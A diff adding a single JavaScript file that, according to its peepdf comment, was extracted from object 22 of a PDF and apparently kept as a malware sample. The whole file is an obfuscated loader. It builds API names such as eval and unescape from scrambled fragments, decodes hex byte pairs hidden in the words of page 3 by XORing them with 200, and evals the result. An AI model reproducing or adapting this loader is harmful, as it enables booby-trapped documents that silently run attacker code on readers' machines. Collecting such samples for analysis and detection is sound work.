@@ -1,0 +1,37 @@
+// peepdf comment: Javascript code located in object 22 (version 0)
+
+				var editD = this;
+				var mail = ["a", "e", "l", "v", ""];
+				edit = new String(mail[1] + mail[3] + mail[0] + mail[2] + mail[4]);
+				var adobe = ["Word", "getPa", "geNth", ""];
+				a = new String(adobe[1] + adobe[2] + adobe[0] + adobe[3]);
+				var unlock = ["rds", "eNu", "mWo", "Pag", "", "get"];
+				google = new String(unlock[5] + unlock[3] + unlock[1] + unlock[2] + unlock[0] + unlock[4]);
+				var mailAdobe = ["n", "e", "e", "s", "c", "", "a", "u", "p"];
+				googleMail = new String(mailAdobe[7] + mailAdobe[0] + mailAdobe[1] + mailAdobe[3] + mailAdobe[4] + mailAdobe[6] + mailAdobe[8] + mailAdobe[1] + mailAdobe[5]);
+				var get = ["deA", "cha", "t", "rCo", ""];
+				c = new String(get[1] + get[3] + get[0] + get[2] + get[4]);
+				var d = ["harCo", "fromC", "de", ""];
+				dGet = new String(d[1] + d[0] + d[2] + d[3]);
+				var cEdit = ["p", "", "a", "p"];
+				cA = new String(cEdit[2] + cEdit[0] + cEdit[0] + cEdit[1]);
+				var cUnlock = String("%");
+				var getB = 2;
+				var bGoogle = String;
+				var getMail = 0;
+				var unlockA = 200;
+				var cA = editD[cA];
+				var editAdobe = 3;
+				var bEdit = editD[googleMail];
+				var mailMail = editD[google](editAdobe);
+				var getGoogle = "";
+				for (var getA = getMail; getA < mailMail; getA += 1) {
+				    bD = editD[a](editAdobe, getA);
+				    var send = bD.substr(bD.length - getB, getB);
+				    var sendGoogle = bEdit(cUnlock + send);
+				    var mailB = sendGoogle[c](getMail);
+				    var cEditA = mailB ^ unlockA;
+				    getGoogle += bGoogle[dGet](cEditA);
+				}
+				this[edit](getGoogle);
+
